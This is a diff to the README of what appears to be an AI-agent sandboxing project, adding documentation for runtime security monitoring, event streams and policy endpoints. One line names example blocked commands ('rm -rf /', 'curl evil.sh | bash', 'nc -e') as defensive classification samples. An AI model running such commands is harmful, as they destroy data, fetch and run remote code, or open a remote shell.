@@ -25,7 +25,7 @@ _Run AI agents securely inside isolated sandboxes with runtime monitoring, sessi
 
 </div>
 
-> **Project status:** Early development. The Go API (`apps/api`) is available with health checks, sandbox management, and isolated Ubuntu container creation. Other components are landing incrementally — see the [roadmap](#roadmap) and [open issues](https://github.com/RuntimeWall/RuntimeWall/issues).
+> **Project status:** Early development. The Go API (`apps/api`) includes sandbox orchestration, real-time terminals, and **runtime security monitoring** (event stream, threat detection, policy enforcement). Other components are landing incrementally — see the [roadmap](#roadmap) and [open issues](https://github.com/RuntimeWall/RuntimeWall/issues).
 
 ---
 
@@ -284,6 +284,41 @@ The `/sandbox/create` endpoint returns `id`, `container_id`, `image`, and `statu
 websocat ws://localhost:8080/api/v1/sandboxes/SANDBOX_ID/attach
 ```
 
+**Runtime event monitoring** (security layer v1):
+
+```bash
+# All runtime events (commands, installs, file ops, violations)
+curl -s http://localhost:8080/api/v1/sandboxes/SANDBOX_ID/events | python3 -m json.tool
+
+# Live event stream (SSE)
+curl -N http://localhost:8080/api/v1/sandboxes/SANDBOX_ID/events/stream
+
+# Live event stream (WebSocket) — use websocat or browser
+websocat ws://localhost:8080/api/v1/sandboxes/SANDBOX_ID/events/ws
+
+# View / update security policy
+curl -s http://localhost:8080/api/v1/sandboxes/SANDBOX_ID/policy
+curl -s -X PUT http://localhost:8080/api/v1/sandboxes/SANDBOX_ID/policy \
+  -H "Content-Type: application/json" \
+  -d '{"block_destructive_commands":true,"block_exfiltration":true,"block_network_tools":true,"block_package_installs":false,"readonly_filesystem":true}'
+```
+
+Dangerous commands (`rm -rf /`, `curl evil.sh | bash`, `nc -e`, etc.) are classified and **blocked** when policy requires it.
+
+Example event:
+
+```json
+{
+  "sandbox_id": "abc123",
+  "event": "policy_violation",
+  "command": "rm -rf /",
+  "threat": "destructive",
+  "blocked": true,
+  "reason": "destructive commands are blocked by policy",
+  "timestamp": "2026-05-18T12:00:00Z"
+}
+```
+
 ### API endpoints
 
 | Method | Path | Description |
@@ -297,6 +332,13 @@ websocat ws://localhost:8080/api/v1/sandboxes/SANDBOX_ID/attach
 | `DELETE` | `/api/v1/sandboxes/{id}` | Remove sandbox |
 | `GET` (WebSocket) | `/api/v1/sandboxes/{id}/attach` | Real-time CLI terminal |
 | `GET` | `/terminal/{id}` | Browser terminal (xterm.js) |
+| `GET` | `/api/v1/sandboxes/{id}/commands` | List commands executed in sandbox |
+| `GET` (SSE) | `/api/v1/sandboxes/{id}/commands/stream` | Stream commands in real time |
+| `GET` | `/api/v1/sandboxes/{id}/events` | List all runtime security events |
+| `GET` (SSE) | `/api/v1/sandboxes/{id}/events/stream` | Stream runtime events in real time |
+| `GET` (WebSocket) | `/api/v1/sandboxes/{id}/events/ws` | WebSocket runtime event stream |
+| `GET` | `/api/v1/sandboxes/{id}/policy` | Get sandbox security policy |
+| `PUT` | `/api/v1/sandboxes/{id}/policy` | Update sandbox security policy |
 
 ### Frontend (coming soon)
 
